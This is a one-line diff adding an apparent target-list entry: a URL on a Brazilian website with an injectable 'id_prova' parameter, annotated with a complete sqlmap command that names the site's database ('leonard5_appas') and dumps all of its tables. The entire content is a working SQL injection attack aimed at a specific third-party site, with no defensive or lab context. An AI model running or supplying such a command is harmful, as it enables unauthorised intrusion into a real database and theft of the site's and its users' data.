@@ -1,0 +1,1 @@
+http://www.appaspastoreio.com.br/index.php?view=detalhesprova&id_prova=21 (GET)  # sqlmap.py -u http://www.appaspastoreio.com.br/index.php?view=detalhesprova&id_prova=21 -D leonard5_appas --tables --dump-all --threads 5 -v3
